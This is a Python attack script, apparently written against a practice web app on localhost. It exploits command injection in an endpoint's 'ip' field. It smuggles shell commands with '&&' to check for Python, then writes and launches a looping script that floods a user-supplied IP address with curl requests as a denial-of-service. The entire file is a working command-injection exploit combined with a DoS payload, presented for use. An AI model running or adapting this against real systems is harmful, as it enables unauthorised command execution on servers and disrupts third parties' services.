import requests

# Target URL for the vulnerable endpoint
url = "http://127.0.0.1:5000/curl"

# Ask user for the IP address to target for the DoS attack
target_ip = input("Enter the target IP address for the DoS attack: ")

# Step 1: Check if Python is installed on the target
check_python_payload = f"{target_ip} && python --version && echo 'Python is installed' || echo 'Python not found'"
data = {
    "ip": check_python_payload
}

try:
    # Send the check command to the server
    response = requests.post(url, data=data)
    
    # Check the response to determine if Python is installed
    if "Python is installed" in response.text:
        print("Python is installed on the target system.")
        
        # Step 2: Send the Python-based DoS attack script
        python_dos_code = f"""
import os
import time

target_ip = '{target_ip}'

# Simple DoS attack by sending continuous ping requests
while True:
    print('sending..........')
    os.system(f'curl {{target_ip}}')
    time.sleep(0.1)
"""

        # Construct the malicious payload to create the Python script
        python_payload = f"{target_ip} && echo \"{python_dos_code}\" > dos_attack.py; python dos_attack.py "

        # Send the Python-based attack payload to the server
        data = {
            "ip": python_payload
        }
        
        response = requests.post(url, data=data)
        print(f"Response from server after sending Python DoS attack: {response.text}")
    
    else:
        print("Python is not installed on the target system.",response.text)
        
except requests.RequestException as e:
    print(f"Failed to send payload: {str(e)}")
